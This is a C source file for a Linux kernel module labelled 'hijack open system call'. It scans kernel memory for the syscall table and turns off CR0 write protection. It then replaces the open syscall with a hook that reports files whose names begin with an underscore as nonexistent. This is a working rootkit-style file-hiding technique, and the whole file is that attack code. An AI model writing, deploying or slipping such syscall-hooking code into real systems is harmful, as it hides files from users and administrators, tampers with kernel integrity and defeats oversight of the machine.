
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/cpumask.h>
#include <linux/pid.h>

#include <asm/unistd.h>
#include <asm/smp.h>

static unsigned long** sys_64_tbl;
unsigned long original_open;

static inline unsigned long __readcr0 (void)
{
         unsigned long val;
         asm volatile("MOV %%cr0,%0\n\t" :"=r" (val));
         return val;
}
 
static inline void __writecr0 (unsigned long val)
{
         asm volatile("MOV %0,%%cr0": :"r" (val));
}

static unsigned long get_syscall_table(unsigned long*** tbl_out)
{
    unsigned long offset;
    *tbl_out = NULL;
    for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset+=sizeof(void*))
        if (((unsigned long**)offset)[__NR_close] == (unsigned long*)sys_close)
        {
            *tbl_out = (unsigned long**)offset;
            break;
        }

    return (unsigned long)*tbl_out;
}

static char * get_basename(const char *filename)
{
    char * basename = strrchr(filename, '/');
    
    if (basename == NULL)
    {
        return filename;
    }

    basename++;

    return basename;
}

static long our_open(const char *filename, int flags, int mode)
{
    unsigned long(*orig)(const char *, int, int) = (unsigned long (*)(const char *, int, int))original_open;

    char * basename = get_basename(filename);

    if (basename != NULL)
    {
        printk(KERN_DEBUG "BASENAME: %s", basename);
        if (basename[0] == '_')
        {
            return -ENOENT;
        }
    }
    
    return orig(filename, flags, mode);
}

static int __init hijack_init(void)
{
	if (!get_syscall_table(&sys_64_tbl))
		return -1;
	{
		__writecr0(__readcr0() & ~X86_CR0_WP);
        original_open = (unsigned long) sys_64_tbl[__NR_open];
        sys_64_tbl[__NR_open] = (unsigned long*)our_open;
		__writecr0(__readcr0() | X86_CR0_WP);
	}

	return 0;
}

static void __exit hijack_cleanup(void)
{
	__writecr0(__readcr0() & ~X86_CR0_WP);
    sys_64_tbl[__NR_open] = (unsigned long*)original_open;
	__writecr0(__readcr0() | X86_CR0_WP);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("scipio@scipio.org");
MODULE_DESCRIPTION("hijack open system call");

module_init(hijack_init);
module_exit(hijack_cleanup);

